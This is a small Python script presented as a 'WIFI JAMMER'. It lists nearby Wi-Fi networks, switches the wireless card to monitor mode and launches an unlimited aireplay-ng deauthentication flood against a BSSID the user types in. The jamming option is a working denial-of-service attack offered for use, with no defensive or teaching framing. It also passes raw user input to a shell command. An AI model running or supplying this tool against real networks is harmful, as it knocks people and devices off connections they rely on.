import wireless
from wifi import Cell
import os
import time

os.system("clear")
print("""WIFI JAMMER MADE BY SLICYBTW
        
        note: this only works in linux
""")

print("""
1. Get Info about network
2. Jam a network
3. Get Network Service Working
""")
choice = input("type in your choice: ")
#wifil = wireless.Wireless()
#interface = wifil.interface()
#all_ns = Cell.all(interface)

if choice == "1":
    print("Getting info from all nearby networks")
    time.sleep(3)
    wifil = wireless.Wireless()
    interface = wifil.interface()
    all_ns = Cell.all(interface)

    for wifi in all_ns:
        print("Network Name: " + wifi.ssid)
        print("Network BSSID: " + wifi.address)
        print("Network Channel: " + str(wifi.channel))
        print("Network Quality: " + str(wifi.quality))
if choice == "2":
    os.system("apt install aircrack-ng")
    print("killing all procceses")
    os.system("airmon-ng check kill")
    print("choosing interface")
    os.system("airmon-ng start wlo1")
    bssid = input("enter the bssid (you can get it from the first option): ")
    os.system(f"aireplay-ng --deauth 0 -a {str(bssid)} wlo1mon")
if choice == "3":
    os.system("clear")
    os.system("airmon-ng stop wlo1mon")
    os.system("service NetworkManager restart")
